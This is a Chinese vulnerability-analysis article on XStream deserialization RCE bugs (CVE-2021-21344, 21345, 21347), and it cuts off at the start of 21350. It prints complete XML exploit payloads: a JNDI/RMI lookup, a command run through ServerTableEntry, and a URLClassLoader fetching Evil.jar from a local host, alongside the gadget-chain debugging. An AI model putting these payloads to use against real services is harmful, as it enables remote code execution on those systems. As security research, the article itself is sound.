> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dfi24JuezqYYEGaKnXU3xQ)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxYKSOLLBMk0J7WVXP9bd5afNnLZTo8n5ZHSuPM9rExvxxbchic6KBOHA/640?wx_fmt=png)

**0x00 前言**
===========

Xstream 是 java 中一个使用比较广泛的 XML 序列化组件，本文以近期 Xstream 爆出的几个高危 RCE 漏洞为案例，对 Xstream 进行分析，同时对 POC 的构成原理进行讲解

**0x01  Xstream 简介**
====================

Xstream 具有以下优点  

*   使用方便 - XStream 的 API 提供了一个高层次外观，以简化常用的用例。
    
*   无需创建映射 - XStream 的 API 提供了默认的映射大部分对象序列化。
    
*   性能  - XStream 快速和低内存占用，适合于大对象图或系统。
    
*   干净的 XML  - XStream 创建一个干净和紧凑 XML 结果，这很容易阅读。
    
*   不需要修改对象 - XStream 可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。
    
*   完整对象图支持 - XStream 允许保持在对象模型中遇到的重复引用，并支持循环引用。
    
*   可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为 XML 的注册。
    
*   安全框架 - XStream 提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。
    
*   错误消息 - 出现异常是由于格式不正确的 XML 时，XStream 抛出一个统一的例外，提供了详细的诊断，以解决这个问题。
    
*   另一种输出格式 - XStream 支持其它的输出格式，如 JSON。
    

下面通过一个小案例来演示 Xstream 如何将 java 对象序列化成 xml 数据

首先是两个简单的 pojo 类，都实现了 Serializable 接口并且重写了 readObject 方法

```
import java.io.IOException;
import java.io.Serializable;

public class People implements Serializable{
    private String name;
    private int age;
    private Company workCompany;

    public People(String name, int age, Company workCompany) {
        this.name = name;
        this.age = age;
        this.workCompany = workCompany;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public Company getWorkCompany() {
        return workCompany;
    }

    public void setWorkCompany(Company workCompany) {
        this.workCompany = workCompany;
    }

    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        System.out.println("Read People");
    }
}
```

```
public class Company implements Serializable {
    private String companyName;
    private String companyLocation;

    public Company(String companyName, String companyLocation) {
        this.companyName = companyName;
        this.companyLocation = companyLocation;
    }

    public String getCompanyName() {
        return companyName;
    }

    public void setCompanyName(String companyName) {
        this.companyName = companyName;
    }

    public String getCompanyLocation() {
        return companyLocation;
    }

    public void setCompanyLocation(String companyLocation) {
        this.companyLocation = companyLocation;
    }

    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        System.out.println("Company");
    }
}
```

然后生成一个 People 对象，并使用 Xstream 对其进行序列化

```
XStream xStream = new XStream();
People people = new People("xiaoming",25,new Company("TopSec","BeiJing"));
String xml = xStream.toXML(people);
System.out.println(xml);
```

最后的执行结果如下

```
<com.XstreamTest.People serialization="custom">
  <com.XstreamTest.People>
    <default>
      <age>25</age>
      <name>xiaoming</name>
      <workCompany serialization="custom">
        <com.XstreamTest.Company>
          <default>
            <companyLocation>BeiJing</companyLocation>
            <companyName>TopSec</companyName>
          </default>
        </com.XstreamTest.Company>
      </workCompany>
    </default>
  </com.XstreamTest.People>
</com.XstreamTest.People>
```

如果两个 pojo 类没有实现 Serializable 接口则序列化后的数据是以下这个样子

```
<com.XstreamTest.People>
  <name>xiaoming</name>
  <age>25</age>
  <workCompany>
    <companyName>TopSec</companyName>
    <companyLocation>BeiJing</companyLocation>
  </workCompany>
</com.XstreamTest.People>
```

看到这里，有些同学可能就意识到了，Xstream 在处理实现了 Serializable 接口和没有实现 Serializable 接口的类生成的对象时，方法是不一样的。

在 TreeUnmarshaller 类的 convertAnother 方法处下断点，如下图所示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxP8fuyYCWeOmTx7aa61MowuMfwBr27KhTYSgprQCPxSjS8vAWWx7b0g/640?wx_fmt=png)

这里会获取一个 converter，中文直译为转换器，Xstream 的思路是通过不同的 converter 来处理序列化数据中不同类型的数据，我们跟进该方法看看在处理最外层的没有实现 Serializable 接口的 People 类时用的是哪种 converter  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxTcDNo1WIhkHsVWsCzV6vYdfdsk6DlKJyl5sybeemOuRg67Yubndgkg/640?wx_fmt=png)

从执行的结果中可以看到最终返回一个 ReflectionConverter，当然不同的类型在这里会返回不同的 Converter，这里仅仅只是处理我们自定义的未实现 Serializable 接口的 People 类时使用 ReflectionConverter，该 Converter 的原理是通过反射获取类对象并通过反射为其每个属性进行赋值，那如过是处理实现了 Serializable 接口并且重写了 readObject 方法的 People 类时会有什么不一样呢？

更换序列化后的数据，在同样的位置打上断点，会发现这里处理 People 的 Converter 由 ReflectionConverter 变成了，SerializableConverter。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxjeIeIYPMunvO4RM8U5QyHqnZxfuzqNSIuVtQjdjwfLPDdoHGibx2AJw/640?wx_fmt=png)

这是我们尝试在 People 类的 readObject 类处打上断点

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxyYu517UAyoxmV34emqzuLIGecuMaNNkcN8xxic421HMxX8zHAlyZ7Lg/640?wx_fmt=png)

会发现执行过程中居然调用了我们重写的 readObject 方法，此时的调用链如下  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxelg4sLVyFl5uPQ9icBVyXCia2VxTy1bBfT0YYAAexMRP6UJfVboKwZFg/640?wx_fmt=png)

既然会调用 readObject 方法的话，那此时我们的思路应该就很清晰了，只需要找到一条利用链，就可以尝试进行反序列化攻击了  

**0x02  CVE-2021-21344**
========================

下面是漏洞相关 POC

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.rowset.JdbcRowSetImpl</class>
                          <name>getDatabaseMetaData</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
                  <javax.sql.rowset.BaseRowSet>
                    <default>
                      <concurrency>1008</concurrency>
                      <escapeProcessing>true</escapeProcessing>
                      <fetchDir>1000</fetchDir>
                      <fetchSize>0</fetchSize>
                      <isolation>2</isolation>
                      <maxFieldSize>0</maxFieldSize>
                      <maxRows>0</maxRows>
                      <queryTimeout>0</queryTimeout>
                      <readOnly>true</readOnly>
                      <rowSetType>1004</rowSetType>
                      <showDeleted>false</showDeleted>
                      <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>
                      <params/>
                    </default>
                  </javax.sql.rowset.BaseRowSet>
                  <com.sun.rowset.JdbcRowSetImpl>
                    <default>
                      <iMatchColumns>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                      </iMatchColumns>
                      <strMatchColumns>
                        <string>foo</string>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                      </strMatchColumns>
                    </default>
                  </com.sun.rowset.JdbcRowSetImpl>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

不难看出最外层封装的类是 PriorityQueue，PriorityQueue 是实现了 Serializable 接口并且重写了 readObject 方法的这点从 POC 中 PriorityQueue 的标签上也看得出，结合我们之前对 XStream 的分析 这次我们直接在 PriorityQueued 的 readObject 方法中打上断点。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxyECvRlpeLF1LysIMcyspP8sQgRpWAOiaPay9BRqg1fdjqHBrGFHDGYw/640?wx_fmt=png)

研究过 java 反序列化的同学对 PriorityQueue 这个类肯定不会陌生，经典的 CommonCollections 利用链中有几个就用到了 PriorityQueue，放一下此刻的调用链。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxicFrZlaMK42287UvgWxZLaOWwyGdFk8ddnpXuP7reaKwyYEPxgib8Ywg/640?wx_fmt=png)

然后我们跟进 heapify() 方法，  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxvRBmgLLjDJAauKBBrtgseVbPKAWCqOib7lEP6LmMQCEa8unALrOZkRg/640?wx_fmt=png)

经过一些调试来到了 PriorityQueue 类的 siftDownUsingComparator 方法中如下图所示。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxychDwiaPpw5Tsw6Ojdd4ibhaye6uPmibVEnkcasMakhtJLUhXODR0U2Qg/640?wx_fmt=png)

这里调用了 PriorityQueue 类中存储在 comparator 属性中的对象的 compare 方法，这时我们回过头来再去看一下 POC

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosox1xqpmdqia0LLbKVQXWw1zMrommcmADeSLic5EzDPNVT7mVAbIjCK5hFw/640?wx_fmt=png)

我们可以很直观的从 XStream 序列化的数据中看到 PriorityQueue 类的 comparator 属性中存储的是一个 sun.awt.datatransfer.DataTransferer$IndexOrderComparator 类型的对象 也就是说接下来会调用 DataTransferer$IndexOrderComparator 对象的 compare 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxnKOe5u9R9rNpEicY0k1CPoLOXNBzreE8UAqGIASf1Rv4eoz6GjnPS8g/640?wx_fmt=png)

剩下的过程就是一系列的嵌套调用，最终会执行到 com.sun.rowset.JdbcRowSetImpl 的 getDatabaseMetaData 中，并最终在 JdbcRowSetImpl 的 connect 方法中通过 JNDI 去 lookup 事先封装在 JdbcRowSetImpl 的 dataSource 中的恶意地址  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxxAOBZOmkrmH3UJe1wlwwr22uWAQbGEgBY6CjDkwy2tmQuiap0TWt01A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxEluylHFNNAy4RzWZuFictthWQbLicbDuhoAptjic70FvZHWm3Akcwcuyw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxwVia1b4dFiaCuaH1hiaVAWCib1RxLmRFC1KOHia7GiaELb4nX9C20M3S04UA/640?wx_fmt=png)

最后贴一下调用栈  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxeuqw87FyN4BaJbWMHBRNEcicSJic8ALWYpn8h5D8Nd4Kv3wznBN7cjvA/640?wx_fmt=png)

CVE-2021-21344 分析至此完毕。  

**0x03 CVE-2021-21345**
=======================

先粘贴一下 cve-2021-21345 的 poc

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>
                          <name>verify</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>
                  <activationCmd>open /Applications/Calculator.app</activationCmd>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

可以看到 21345 的利用链较之 21344 的利用链来说变化不大，唯一的不同点在于执行代码的位置不再使用 JdbcRowSetImpl 去远程加载恶意类来到本地执行恶意代码，而是使用 com.sun.corba.se.impl.activation.ServerTableEntry 类直接在本地执行恶意代码，从利用的复杂度上来和 21344 做比较的话无疑是简单的不少，既然整个利用链中变化的只有这一处，那就单分析这个类就可以了，将断点直接打在 ServerTableEntry 类的 verify 方法上。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxfTxZ4phQibhxCmqibQIAt35vqhGLjicV35A1VibGcBNunPpoGY5F7oNX2A/640?wx_fmt=png)

这里直接将 activationCmd 属性中的值作为参数调用 Runtime.exec 来进行执行，而 activationCmd 在序列化的数据中就已经被我们自定义了值。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosox6EzfWylQqAJ0Xwrrx7u8rGDicJwguloQ56SMBa5QU0KaDnzHmMfia2nw/640?wx_fmt=png)

由于调用栈和 CVE-2021-21344 基本一样所以就不再重复粘贴的，至此 CVE-2021-21345 分析完毕  

**0x04  CVE-2021-21347**
========================

首先先看下 POC

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='javafx.collections.ObservableList$1'/>
    </default>
    <int>3</int>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
      <dataHandler>
        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
          <contentType>text/plain</contentType>
          <is class='java.io.SequenceInputStream'>
            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>
                <names class='java.util.AbstractList$Itr'>
                  <cursor>0</cursor>
                  <lastRet>-1</lastRet>
                  <expectedModCount>0</expectedModCount>
                  <outer-class class='java.util.Arrays$ArrayList'>
                    <a class='string-array'>
                      <string>Evil</string>
                    </a>
                  </outer-class>
                </names>
                <processorCL class='java.net.URLClassLoader'>
                  <ucp class='sun.misc.URLClassPath'>
                    <urls serialization='custom'>
                      <unserializable-parents/>
                      <vector>
                        <default>
                          <capacityIncrement>0</capacityIncrement>
                          <elementCount>1</elementCount>
                          <elementData>
                            <url>http://127.0.0.1:80/Evil.jar</url>
                          </elementData>
                        </default>
                      </vector>
                    </urls>
                    <path>
                      <url>http://127.0.0.1:80/Evil.jar</url>
                    </path>
                    <loaders/>
                    <lmap/>
                  </ucp>
                  <package2certs class='concurrent-hash-map'/>
                  <classes/>
                  <defaultDomain>
                    <classloader class='java.net.URLClassLoader' reference='../..'/>
                    <principals/>
                    <hasAllPerm>false</hasAllPerm>
                    <staticPermissions>false</staticPermissions>
                    <key>
                      <outer-class reference='../..'/>
                    </key>
                  </defaultDomain>
                  <initialized>true</initialized>
                  <pdcache/>
                </processorCL>
              </iterator>
              <type>KEYS</type>
            </e>
            <in class='java.io.ByteArrayInputStream'>
              <buf></buf>
              <pos>-2147483648</pos>
              <mark>0</mark>
              <count>0</count>
            </in>
          </is>
          <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
      </dataHandler>
      <dataLen>0</dataLen>
    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

可以看到这个漏洞的利用链就和之前两个大不相同了，并且在分析该漏洞的时候也踩了一些坑，在这里也和大家详细说明一下

这里我先用 jdk 1.8.20 版本来复现这个漏洞，然而执行的时候却返回以下错误

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxqlH4TxhaRZwVg8ktn9S1L0fZgGI1XJ9JVEb1CjupBDjJsuia7pc1AoQ/640?wx_fmt=png)

一开始没太明白这里是出了什么问题 先是跟着报错信息中提示的路径去看了一下，发现是在反序列化 PriorityQueue 的 comparator 属性的时候出现了问题。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxlEaebzVAwoLSHfYF0vlt3nV4euovpMQzVWFTYkVgJUMicu7QNXPNalQ/640?wx_fmt=png)

经过一段跟踪调试，跟踪到类加载的地方发现根本找不到这个 ObservableList$1 的对象，从这个名字带有 $1 不难看出，这是一个匿名内部类对象，此时我们先去 ObservableList 这个类中去查看一下，然后发现 ObservableList 是一个接口类型，源码如下

```
public interface ObservableList<E> extends List<E>, Observable {

    public void addListener(ListChangeListener<? super E> listener);

    public void removeListener(ListChangeListener<? super E> listener);

    public boolean addAll(E... elements);

    public boolean setAll(E... elements);

    public boolean setAll(Collection<? extends E> col);

    public boolean removeAll(E... elements);

    public boolean retainAll(E... elements);


    public void remove(int from, int to);

    public default FilteredList<E> filtered(Predicate<E> predicate) {
        return new FilteredList<>(this, predicate);
    }

    public default SortedList<E> sorted(Comparator<E> comparator) {
        return new SortedList<>(this, comparator);
    }

    public default SortedList<E> sorted() {
        return sorted(null);
    }
}
```

发现根本就没有什么匿名内部类，此时分析陷入了僵局，然后经过该漏洞的作者 threedr3am 师傅的指导，尝试更换了下 JDK 的版本，将 JDK 版本更换为 1.8.131 版本后 ObservableList 的源码发生了变化。这里只粘贴关键的代码。

```
public default SortedList<E> sorted(Comparator<E> comparator) {
    return new SortedList<>(this, comparator);
}

/**
 * Creates a {@link SortedList} wrapper of this list with the natural
 * ordering.
 * @return new {@code SortedList}
 * @since JavaFX 8.0
 */
public default SortedList<E> sorted() {
    Comparator naturalOrder = new Comparator<E>() {

        @Override
        public int compare(E o1, E o2) {
            if (o1 == null && o2 == null) {
                return 0;
            }
            if (o1 == null) {
                return -1;
            }
            if (o2 == null) {
                return 1;
            }

            if (o1 instanceof Comparable) {
                return ((Comparable) o1).compareTo(o2);
            }

            return Collator.getInstance().compare(o1.toString(), o2.toString());
        }
    };
    return sorted(naturalOrder);
}
```

可以看到 sorted() 方法里面多了一个 Comparator 类型的匿名内部类对象，而这个就是我们反序列化是 POC 中的那个 ObservableList$1，这里写一个简单的例子验证一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxiciaTPsPIpdFYqK57gAsluoPnKLIZqNLUNY4zq9nPDN69kQg0pZZYaOQ/640?wx_fmt=png)

该漏洞利用的时候对 JDK 的版本有一定的限制，

接下来开始继续分析，然后当我用 JDK1.8.131 再次运行的时候又爆了另一个错误

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxJLnaBH4sPrUibak6gYMUrercAtUQansLCxbsBgLOoNDg1JFG5BGxnYA/640?wx_fmt=png)

这里提示找不到 java.security.ProtectionDomain$Key.outer-class 这个属性，然后经过一段让人头秃的调试后终于搞明白了其中缘由。

首先着重看一下出现问题的 POC 的位置

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxFtzhfGTnnjLq90CmPIK1ZvibDCjbmzzBZa55uzsePcn2P9J8y1hryzg/640?wx_fmt=png)

导致报错的就是这个 outer-class 标签，报错的原因是反序列化的时候找不到这个 outer-class 属性，我们来到对应的类也就是 ProtectionDomain$Key 这个类中查看一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxjH6YUuxzDjy9IibV2PiaO6t1778lLZQvY9Gaff7FqkibQZZ2hNjFMLwuQ/640?wx_fmt=png)

发现 key 是一个静态内部类。

接下来我们要搞明白，就 XStream 在什么情况下在序列化的数据中出现这个 outer-class 标签，这里进行一个简单的实验

```
class Foo {
    private String foocontent;
    private Bar bar;

    public String getFoocontent() {
        return foocontent;
    }

    public void setFoocontent(String foocontent) {
        this.foocontent = foocontent;
    }

    public Bar getBar() {
        return bar;
    }

    public void setBar(Bar bar) {
        this.bar = bar;
    }
    
    class Bar {
        private String blabla;

        public String getBlabla() {
            return blabla;
        }

        public void setBlabla(String blabla) {
            this.blabla = blabla;
        }

    }

}
```

这里有两个类，一个是 Foo 类，另一个 Bar 是一个成员内部类，这里 Foo 有一个属性 bar 用来存储一个 Bar 类型的数据。接下来我们实例化一下这个类，然后对其属性进行赋值，并用 XStream 对其进行序列化

```
public static void main(String[] args) {
        Foo foo = new Foo();
        Bar bar = foo.new Bar();
        bar.setBlabla("hello");
        foo.setBar(bar);
        XStream xstream = new XStream();
        String xml = xstream.toXML(foo);
        System.out.println(xml);
    }
```

查看执行结果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxs2kJStl0mcvmVhfPh7kfiaBEdA1C9ibWExzZribzSqibeXqxooE2xbluqg/640?wx_fmt=png)

当引用了自己的成员内部类时，XStream 就会通过 outer-class 来进行标识。在回过去看 poc 就可以理解这里表示的意思是 Key 作为一个成员内部类被 ProtectionDomain 引用，但是在 jdk1.8.131 中 ProtectionDomain$Key 是一个静态内部类呀，静态内部类 XStream 序列化的时候是不会通过 <outer-class> 标签进行标识的

介于之前菜的坑，我又将 jdk 版本更换到 1.8.221 版本此时再看 ProtectionDomain$Key 这个类，可以看到在 1.8.221 版本的 jdk 中，Key 已经从静态内部来改成一个成员内部类了，此时在运行 POC 就不会报找不到 outer-class 的错误了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxKPZIaOcCaNica7GNmBrNbjjPhxmQnA9UEC2LOutibGkJu5ekrmyKUOlw/640?wx_fmt=png)

当然既然在 jdk1.8.131 版本中 Key 时静态内部类，那我们也可以直接通过在 POC 中删除 <outer-class> 这个标签来避免这个报错。

不过虽然时不报错了，但是我们还是没搞清楚这个 outer-class 究竟为什么会有这条属性，这里引用一篇文章 java 非静态内部类中的属性 this$0

接着用我们写的 Demo 中的 Foo 类和它的成员内部类 Bar 类来进行讲解，在 Foo$Bar 对象生成过后我打一个断点

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxLGFXrhp2BVVseLicRY0B7ahUHicPrFtnKgmRrfiaFaDujTI20pvoSIV4Q/640?wx_fmt=png)

这里有一个变量名为 this$0 的一个变量，仔细观察他的类型，发现是一个 Foo 类型的，也就是说他是 Foo 这个最外层的类对象，还记得学习 java 基础的时候在学习内部类的时候学过的一个知识点，就是内部类可以直接使用外部类的公有或私有变量，而外部类却不能直接使用内部类的变量，就是因为内部类会在编译时就加入一个外部类作为变量。

搞明白了这一点后我们就继续分析 gadget

同样的 PriorityQueue 部分就不再重复讲解了，只贴一下调用链

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxQD6bEd5ibO0HtPBhLd5pjXnD77eoODA5cYkjctTWNJAsGaQy4QxtdMA/640?wx_fmt=png)

我们从 ObsevableList$1 这个匿名内部类开始讲起，我们来看下这个匿名内部类的实现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxJlibYZJJC3O8uAm4ly3Y0Rhrn2hOiapbThibpgTR3QAiaTXHnmxVbiagtlA/640?wx_fmt=png)

这里 o1 和 o2 是同一个 Base64Data 对象，目的调用 Base64Data.toString 方法，跟入查看 toString 方法详情

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxsfNM5fw9bP7ibFttq68Pp9nSxK2XXkEicnG8KmDtib5IyCqmkf1OAG82A/640?wx_fmt=png)

toString 方法中调用了 Base64Data.get 方法，继续跟入，在 get 方法中调用了 ByteArrayOutputStreamEx.readFrom() 方法，而传入的参数则是一个 SequenceInputStream 对象。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxYWd0XibCIL2UiaVqQ021PhBOZBaOX82RN4kbUvQZoH4EmQsicAHgeCkVg/640?wx_fmt=png)

这里先粘贴一下此时整个 Base64Data 对象的封装情况。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxxfsHsHEic8NwRzJDhEsic4w4ys5ibXjD0ick5okZwsBzTeDbCdA4ggw7dg/640?wx_fmt=png)

跟入 ByteArrayOutputStreamEx.readFrom() 方法，经过几次嵌套调用后，来到了 SequenceInputStream.nextStream() 方法中，这里的关键是调用了属性 e，也就是 POC 中就封装进去的 MultiUIDefaults$MultiUIDefaultsEnumerator 对象的 hasMoreElements() 方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxDicFZLanBXLrdnPrZQiawXgKzF9OZqPoMVd118ukJmDYQUeMacaIgRAQ/640?wx_fmt=png)

继续跟进，就会看到调用了 JavacProcessingEnvironment$NameProcessIterator.hasNext() 方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxOG9BndXsEjw2r8EnFEnMlbKUnBDFvLhrNo8I3u8NHP50zgUclicTibrA/640?wx_fmt=png)

当跟入到 hasNext() 方法方法后可以看到该方法中的关键点在于，调用 processorCL 的 loadClass 方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxd8dCIr9wniaSvlebK0HUonjk8HkFEs7c6kiataoFFt0ibuhyKdEhoEOXg/640?wx_fmt=png)

我们直接从 POC 中来查看 processorCL 就是封装进去的 URLClassLoader 对象，而 var1 就是封装入 names 属性中的 Arrays$ArrayList 对象中存储的字符串也就是恶意类的名字。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxQqQAOn4gaSoGucUp2viaEzLhnTlDlA6qFyHqpU9NodPeTQLJ3Ce4wzg/640?wx_fmt=png)

接下来的步骤就是通过 URLClassloader 去远程加载恶意类到本地 然后执行静态代码块中的恶意代码从而导致 RCE，这个过程就不进行深入赘述了，至此 CVE-2021-21347 漏洞分析完毕

**0x05  CVE-2021-21350**
========================

粘贴一下 POC

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='javafx.collections.ObservableList$1'/>
    </default>
    <int>3</int>
